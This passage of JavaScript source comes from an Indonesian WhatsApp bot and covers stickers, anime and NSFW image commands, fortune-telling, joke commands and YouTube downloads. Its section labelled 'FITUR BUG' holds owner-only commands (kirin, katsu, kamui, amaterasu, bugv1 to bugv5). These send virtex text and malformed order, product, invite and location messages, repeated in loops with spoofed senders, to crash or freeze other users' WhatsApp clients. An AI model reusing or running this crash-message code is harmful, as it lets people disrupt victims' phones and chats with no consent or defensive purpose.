				"sticker-pack-name": packname,
				"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
				let len = JSON.stringify(json).length	
				let last	
				if (len > 256) {	
				len = len - 256	
				bytes.unshift(0x01)	
				} else {	
				bytes.unshift(0x00)	
				}	
				if (len < 16) {	
				last = len.toString(16)	
				last = "0" + len	
				} else {	
				last = len.toString(16)	
				}	
				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	
				const buf5 = Buffer.concat([littleEndian, buf2, buf3, buf4])	
				fs.writeFile(`./stickers/${name}.exif`, buf5, (err) => {	
					return `./stickers/${name}.exif`	
				})	
			}
       



  //if (atibot === true) return reply("antibot on")
       

const b1 = ["pukulin","kocok"]
            const bully1 = b1[Math.floor(Math.random() * b1.length)]
const b2 = ["gebukin","santet"]
            const bully2 = b2[Math.floor(Math.random() * b2.length)]
const b3 = ["sayang","peluk"]
            const bully3 = b3[Math.floor(Math.random() * b3.length)]
       




















 

 











 

 



































































































































































                



















       
       
   
try{ 
switch (command) {
	
	     
        case 'otakuongoing':
        foto = "https://scontent.fsoc1-1.fna.fbcdn.net/v/t1.6435-9/fr/cp0/e15/q65/188003580_4116632188418959_278745899359955746_n.jpg?_nc_cat=103&ccb=1-5&_nc_sid=dd9801&efg=eyJpIjoidCJ9&_nc_eui2=AeG4z3lv0O18aOogz9z4bTKXs2y4Py2lZA6zbLg_LaVkDlt2CdW-kPfFvP1J7CerX8cxRV77uMn7qmIDWOp5lF1y&_nc_ohc=AbIIeSsQe_QAX8xtiGD&tn=UG311hBS0PFny35a&_nc_ht=scontent.fsoc1-1.fna&oh=69b3b9e62b37fe616d06d66aa3b2c061&oe=61C2FB93"
        fotonya = await getBuffer(foto)
         let buttonoy = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `Done`},"type": "RESPONSE"}]
        onGoing().then(res => {  	
    update = `\nBerikut adalah update anime yang akan datang\n\n`
    for ( let i of res){
    update +=`Judul: ${i.judul}\nEpisode: ${i.eps}\nHari: ${i.hri}\nTanggal: ${i.tgl}\n\n`
    }
    
    
     //foto = i.thumb.length
     //acak = i.thumb[Math.floor(Math.random() * foto.length)] 
     //console.log(foto)
     sendButLocation(from, update, copyright, fotonya, buttonoy, {contextInfo: forward})
    
})
break
        
        
	
	case 'cerpen':
	RA.RandomCerpen().then(respon => {
     teks =`*Author:* ${respon.author}\n*Judul:* ${respon.data.judul}\n*Kategori:* ${respon.data.kategori}\n\n${respon.data.cerita}`
   reply2(teks)
})
	break
	
	
	case 'wallpaper':
	reply(mess.wait)
	if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
	tod.wpsearch(`${q}`)
    .then(result => {
   const wallpaper = result[Math.floor(Math.random() * result.length)]              
    sendFileFromUrl(wallpaper, image, {quoted: dev, caption: "Nih"})
});
limitAdd(sender, limit)
break
	
	
	
	case 'nsfwmenu':   
    menunya = hentong.ahah(prefix, pushname)
           let woker = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                                  {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": `RESPONSE`}]
  if(katalog) {
  costum(`*Loading...*`, text, tescuk, `*${fake}*`)
 sendKatalog(hentong.ahah(prefix, pushname))
 } else if(troli) {
 sendTroli(hentong.ahah(prefix, pushname))
 } else if(Lokasi){
 costum(`*Loading...*`, text, tescuk, `*${fake}*`)
 sendButLocation(from, menunya, `© ${fake1}`, fs.readFileSync('./stik/allmenu.jpg'), woker, {contextInfo: forward})
 } else  if(dokumen) {
 costum(`*Loading...*`, text, tescuk, `*${fake}*`)
 Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./temp/Extream.docx'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./stik/thumbnaildokumen.jpg'), filename:`${namaDocument}`,filesize: "1000", pageCount: "2022"},woker, options)
  }
break
	
	case 'menu':
    case 'help':   
    try{
    stod = `${sender}`
    menunya = help.menu(listcmdblock, kyun, process, timeWit, timeWita, timeWib, multi, fs, isPremium, getLimit, limit, limitCount, balance, getBalance, sender, blocked, ban, listerror, user, autosticker, forwarding, fake,autoread, autovn, typing, Antibuggc,antibugtroli,Toxic, isAntihidetag, isKickarea, isAntiLink, AntiVirtex, isAntiviewonce, hitnya, pushname, ucapanWaktu, prefix, publik, week, weton, calender)
    let mok = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]

    options = {contextInfo: { forward, externalAdReply:{title: `${ucapanWaktu} kak`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:"https://youtu.be/_IlvsY7S7j8"}}}
    
    
 if(katalog) {
 	costum(`*Loading...*`, text, tescuk, `*${fake}*`)
    sendKatalog(menunya)
    }  if(troli) {
    sendTroli(menunya)
    }else  if(dokumen) {
    costum(`*Loading...*`, text, tescuk, `*${fake}*`)
    Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./temp/Extream.pdf'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./stik/thumbnaildokumen.jpg'), filename:`${namaDocument}`,filesize: "1000", pageCount: "2022"},mok, options)
    } else  if(Lokasi) {
    costum(`*Loading...*`, text, tescuk, `*${fake}*`)
	sendButLocation(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), mok, {contextInfo: forward})
	}
	} catch(err) {
	sendTroli(menunya)
	}
    break
	
	
	

	

	
	
        case 'setmenu':
	if(!isOwner) return
	if ((args[0]) === 'katalog'|| (args[0]) === 'product' ){
		katalog = true
		Lokasi = false
		troli = false
		dokumen = false
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'lokasi' ){
		Lokasi = true
		katalog = false
		troli = false
		dokumen = false
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'troli' ){
		Lokasi = false
		katalog = false
		troli = true
		dokumen = false
		
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		}else if ((args[0]) === 'document' || (args[0]) === 'pdf' || (args[0]) === 'dokumen' || (args[0]) === 'ori'){
		Lokasi = false
		katalog = false
		troli = false
		dokumen = true
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if (!q) {
                      sendButMessage(from, `SETTING MENU`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}setmenu katalog`, buttonText: {displayText: `ᴋᴀᴛᴀʟᴏɢ`},type: 1},
                      {buttonId: `${prefix}setmenu troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
                      {buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
                    }
	break
        
       
	
	
	
	                case 'neko':
					case 'waifu':
					case 'trap':
					case 'blowjob':
					
					if (!isNsfw && isGroup) return reply("Fitur nsfw blom aktif")
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					reply(mess.wait)
					ana = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(sender, limit)
					break
					
					case 'yuri':
					case 'kiss':
					case 'cum':
					case 'futanari':
					case 'hentai':
					case 'eroyuri':
					case 'eron':
					case 'erok':
					case 'ero':
					case 'solo':
					case 'erokemo':
					case 'fox_girl':
					case 'feet':
					case 'les':
					case 'feed':
					case 'bj':
					if (!isNsfw && isGroup) return reply("Fitur nsfw blom aktif")
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					reply(mess.wait)
					ana = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
					sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(sender, limit)
					break
				
				     
                     case 'neko':
                     case 'shinobu':
                     case 'megumin':
				     case 'bully':
                     case 'cuddle':
                     case 'cry':
                     case 'hug':
				     case 'awoo':
                     case 'kiss':
                     case 'lick':
                     case 'pat':
				     case 'smug':
                     case 'bonk':
                     case 'yeet':
                     case 'blush':
				     case 'smile':
                     case 'wave':
                     case 'highfive':
                     case 'handhold':
				     case 'nom':
                     case 'bite':
                     case 'glomp':
                     case 'slap':
				     case 'kill':
                     case 'happy':
                     case 'wink':
					reply(mess.wait)
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
					sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(sender, limit)
					break
					
					case 'waifunime':
					reply(mess.wait)
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(sender, limit)
					break
					
					
					
					
					case 'baka':
					case 'hug':
					case 'kemonomimi':
					case 'holo':
					reply(mess.wait)
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(sender, limit)
					break
				
	
	
	//PRIMBON
	case 'artinama':
	try{
	if(!q) return reply("Namanya apa kak ?")
	primbon.artiNama(q).then(res => {
    reply2(res)
})
} catch (err) {
console.log(err)
reply("Bjeer error, coba lagi dong 😋")
}
break



case 'artimimpi':
try{
if(!q) return reply("Mimpi apa semalem ?")
primbon.tafsirMimpi(q).then(res => {
    reply2(res)
})
} catch (err) {
console.log(err)
reply("Bjeer error, coba lagi dong 😋")
}
break


case 'namapasangan':
try{
if(!q) return reply("Namanya siapa kak ? Contoh jajas titin")
if(args.length < 2) return reply("Masukan nama pasangan Contoh jajas titin")
if(args.length > 2) return reply("Masukan nama pasangan Contoh jajas titin")
primbon.Jodoh(args[0],args[1]).then(res => {
    reply2(res)
})
} catch (err) {
console.log(err)
reply("Bjeer error, coba lagi dong 😋")
}
break

case 'tanggaljadian':
try{
if(!q) return reply("Tanggal berapa kak ? Contoh 01-07-2000")
primbon.tanggaljadi(q).then(res => {
    reply2(res)
})
} catch (err) {
console.log(err)
reply("Bjeer error, coba lagi dong 😋")
}
break

case 'tipewatak':
try{
if(!q) return reply("Teksnya ? Contoh nih Michelle Ziudith 20-1-1995")
if(args.length < 2) return reply("Masukan Teksnya Contoh nih Michelle  20-1-1995")
if(args.length > 2) return reply("Masukan Teksnya Contoh nih Michelle  20-1-1995")
primbon.watakartis(args[0], args[1]).then(res => {
    reply2(res)
})
} catch (err) {
console.log(err)
reply("Bjeer error, coba lagi dong 😋")
}
break

case 'ramalanjodoh':
try{
if(!q) return reply(" Teksnya ? Contoh nih joe 11-4-2003 putri 1-2-2005")
if(args.length < 4) return reply("Masukan Teksnya Contoh nih joe 11-4-2003 putri 1-2-2005")
if(args.length > 4) return reply("Masukan Teksnya Contoh nih joe 11-4-2003 putri 1-2-2005")
primbon.ramalanjodoh(args[0], args[1], args[2],args[3]).then(res => {
    reply2(res)
})
} catch (err) {
console.log(err)
reply("Bjeer error, coba lagi dong 😋")
}
break

case 'ramalanrejeki':
try{
if(!q) return reply("Tanggalnya mana kak Contoh 11-1-2000")
primbon.rejekiweton(q).then(res => {
    reply2(res)
})
} catch (err) {
console.log(err)
reply("Bjeer error, coba lagi dong 😋")
}
break


case 'kecocokannama':
try{
if(!q) return reply("Tanggalny mana kak Contoh angel 18-5-20005")
if(args.length < 2) return reply("Masukan Tanggalny Contoh angel 18-5-20005")
if(args.length > 2) return reply("Masukan Tanggalny Contoh angel 18-5-20005")
primbon.kecocokannama(args[0], args[1]).then(res => {
    reply2(res)
})
} catch (err) {
console.log(err)
reply("Bjeer error, coba lagi dong 😋")
}
break

case 'haribaik':
try{
if(!q) return reply("Tanggalnya mana kak Contoh 1-1-2000")
primbon.haribaik(q).then(res => {
    reply2(res)
})
} catch (err) {
console.log(err)
reply("Bjeer error, coba lagi dong 😋")
}
break



case 'harilarangan':
try{
if(!q) return reply("Tanggal nya mana kak Contoh 1-1-2000")
primbon.harilarangan(q).then(res => {
    reply2(res)
})
} catch (err) {
console.log(err)
reply("Bjeer error, coba lagi dong 😋")
}
break








	
	case 'bullyuk':
     if(!isWelkom) return
     if(isExtream) return
     reply(`Hayuk ah`)
     setTimeout(() => {
      sendButMessage(from, `Enaknya di apain nih 🤭`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}${bully1} ${q}`, buttonText: {displayText: `di ${bully1}`,},type: 1},
                      {buttonId: `${prefix}${bully2} ${q}`, buttonText: {displayText: `di ${bully2}`,},type: 1},
                      {buttonId: `${prefix}${bully3} ${q}`, buttonText: { displayText: `di ${bully3}`,},type: 1}]);
           }, 2000)
           break
	
	case 'sayang':
          if(!isWelkom) return
          if(isExtream) return
          sendMess(`Ciee di sayang\nUntuk @${q} kamu di sayang😘 sama ${pushname} awokawok`)
          break
           
         case 'peluk':
           if(!isWelkom) return
           if(isExtream) return
           sendMess(`Ciee di peluk\nuntuk @${q} kamu mau gak di peluk sama ${pushname} :v`)
           break
           
   case 'gebukin':
           if(!isWelkom) return
           if(isExtream) return
           reply(`@${q} Berhasil di gebukin dan sekarang babak belur + bonyok :v`)
           break
           
     case 'pukulin':
           if(!isWelkom) return
           if(isExtream) return
           reply(`@${q} Berhasil di pukulin dan sekarang dia bonyok-bonyok :v`)
           break
           
     case 'santet':
           if(!isWelkom) return
           if(isExtream) return
           reply(`Berhasil menyantet si @${q} dan sekarang dia mencret paku`)
           break
           
case 'kocok':
           if(!isWelkom) return
           if(isExtream) return
           reply(`*ERROR*`)
            break
	
	
	
	
	
      
           
           
           
	
	
	
        
        
        
        
        
        
        
	
	
	
	
	
	
	
	case 'play':     
if(!q) return reply("Mau cari musik apa kak ?") 
if(q.includes("youtube.com")) return reply("Masukan judul lagu")
          reply(mess.wait)
res = await yts(q)
 rus = await y2mateA(`${res.all[0].url}`)
 ras = await y2mateV(`${res.all[0].url}`)
 imagenya = await getBuffer(res.all[0].image)
 let oki = `    
Judul : ${res.all[0].title}
Ditonton : ${res.all[0].views}
Durasi : ${res.all[0].timestamp}
File Audio : ${rus[0].size}
File Video : ${ras[0].size}`

halogaes = await xdev.prepareMessage(from, imagenya, image)
tombol = [
  {buttonId: `${prefix}playmp3 ${res.all[0].url}`, buttonText: {displayText: `ᴀᴜᴅɪᴏ`}, type: 1},
  {buttonId: `${prefix}playmp4 ${res.all[0].url}`, buttonText: {displayText: `ᴠɪᴅɪᴏ`}, type: 1}
]
gbuttonan = {
imageMessage: halogaes.message.imageMessage,
    contentText: oki,
    footerText: `© ${fake1}`,
    buttons: tombol,
    headerType: 4
}
 xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage,{
 	contextInfo: { forwardingScore: totalForward, isForwarded: forwarding}
 })
  break
  
  
  case 'play2':      
  if(!q) return reply("Teksnya mana om")
          reply(mess.wait)
res = await yts(q)
 rus = await y2mateA(`${res.all[0].url}`)
 ras = await y2mateV(`${res.all[0].url}`)
 imagenya = await getBuffer(res.all[0].image)
 let okiu = `    
Judul : ${res.all[0].title}
Ditonton : ${res.all[0].views}
Durasi : ${res.all[0].timestamp}
File Audio : ${rus[0].size}
File Video : ${ras[0].size}`
									let aklo = [{
										"buttonId": `${prefix}playmp3 ${res.all[0].url}`,
										"buttonText": {
											"displayText": `ᴀᴜᴅɪᴏ`
											},
										"type": "RESPONSE"
										},{
										"buttonId": `${prefix}playmp4 ${res.all[0].url}`,
										"buttonText": {
											"displayText": `ᴠɪᴅɪᴏ`
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from, okiu, `\n© ${fake1}`, imagenya, aklo, {contextInfo: forward})
										break
  
  
  
  
  
  case 'playmp3':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let like = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!like) return reply(mess.error.Iv)
				try {
				reply("*Downloading...*")   
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 20000) return reply("Tidak bisa mendownload karena file melebihi batas")
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
  
  
  
  case 'playmp4':
                     if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
                     if (args.length === 0) return reply(`Kirim perintah *${prefix}playmp4 [linkYt]*`)
			         let okek = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			         if (!okek) return reply(mess.error.Iv)
                     reply("*Downloading...*")   
				     try {
				     ytv(args[0])
				    .then((res) => {
				     const { dl_link, thumb, title, filesizeF, filesize } = res
				     axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				    .then((a) => {
				     if (Number(filesize) >= 50000) return reply("Tidak bisa mendownload karena file melebihi batas")
				     sendMediaURL(from, dl_link).catch(() => reply(mess.Iv)) 
				     limitAdd(sender, limit)
				     })		
				     })
				     } catch (err) {
			         reply(mess.error.Iv)
				     }
				    break
  
  
  
  
  

	
	
	
	
	
	
	
	
	
	
//-------------------------------》FITUR BUG《-------------------------------\\
	
case 'kirin':
      if(isExtream) return
           if (!isOwner) return sendvn(gakmau)
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           xdev.sendMessage(from, {
                        'groupName': fake,
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })        
           }
           break
 
 
 
 case 'katsu':
      if(isExtream) return
           if (!isOwner) return sendvn(gakmau)
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo: forward})
                             
           }
           break
           
           
           case 'kamui':
                if(isExtream) return
           if (!isOwner) return sendvn(gakmau)
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           var kirin = xdev.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: forward
                });
                 xdev.relayWAMessage(kirin)
                             
           }
           break
 
 
 
 
	
	
	case 'amaterasu':
     if(isExtream) return
      if(!isOwner) return reply('*Khusus owner*')
{
var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': 10000901,
                        'status': 1,
                        'surface': 1,
                        'message': philip(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 xdev.relayWAMessage(kirim)
                 
                 
                 
         xdev.sendMessage(from, virtex8(prefix), text,  {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                               'thumbnail': virgam,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': {'forwardingScore': 100000000, 'isForwarded': true, 'sendEphemeral': true}
                })
                
                
                xdev.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                    })        
                
                
                xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo: {forwardingScore: 100000000, isForwarded: true}})
                             
                             hmm4 = fs.readFileSync('./stik/trava1.jpg'),
               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': {
                                'forwardingScore': 100000000,
                                'isForwarded': true,
                                'sendEphemeral': true
                            }
                        }
                    }, {
                  contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                    }), 
                  xdev.relayWAMessage(res)
                             
                             
                             
                    
                    const nana = fs.readFileSync('./stik/trava.jpg');
                        xdev.sendMessage(from, nana, image, {thumbnail: virgam, contextInfo:{ forwardingScore: 100000000, isForwarded: true}});
                        
                        
                        var kirin = xdev.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 xdev.relayWAMessage(kirin)
                        
                        
                    
 kok = fs.readFileSync('./lib/amaterasu.mp3')
await xdev.sendMessage(from, kok, audio, {  'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': 4,
                                    'status': 1,
                                    'surface': 1,
                                     'message': 'NOPE',
                                    'orderTitle': fake,
                                    'thumbnail': davizin,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }, caption: virtex7(prefix),
                   
                })
             
                }

break
           
           case 'bugv1':
                if(isExtream) return
         if (!isOwner) return sendvn(gakmau)
              {
                var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': 10000901,
                        'status': 1,
                        'surface': 1,
                        'message': virtex7(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                 xdev.relayWAMessage(kirim)

                }
                break;
                
             
                case 'bugv2':
                     if(isExtream) return
            if (!isOwner) return sendvn(gakmau)
                             xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo:forward})
                            break
                
                
                
                case 'bugv3':
                     if(isExtream) return
                   if (!isOwner) return sendvn(gakmau)
                xdev.sendMessage(from, `${virtex7(prefix)} `, text, {
                    'contextInfo': {
                        'text': '🔥',
                        'forwardingScore': 999999999,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title': 'bug',
                            'body': '',
                            'previewType': 'PHOTO',
                            'thumbnail': thumb,
                            'sourceUrl': ''
                        }
                    },
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                         'remoteJid': '0@s.whatsapp.net'
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 3,
                                'status': 'INQUIRY',
                                'surface': 'CATALOG',
                                'message': 'NOPE',
                                'orderTitle': 'hay',
                                'thumbnail': davizin,
                                  'sellerJid': '0@s.whatsapp.net'
                            }
                        }
                    }
                });
                break;
                
                
                
                
                
           case 'bugv4':
                if(isExtream) return
                    if (!isOwner) return sendvn(gakmau)
                    if(isGroup) return reply("Gunakan bug ini di chat")
           {                
                    xdev.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })             
                    }
                    break;
                    
           case 'bugv5':
                if(isExtream) return
                    if (!isOwner) return sendvn(gakmau)
           {
              
               hmm4 = fs.readFileSync('./stik/trava1.jpg'),
               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': forward
                        }
                    }, {
                  contextInfo: forward
                    }), 
                  xdev.relayWAMessage(res)
                
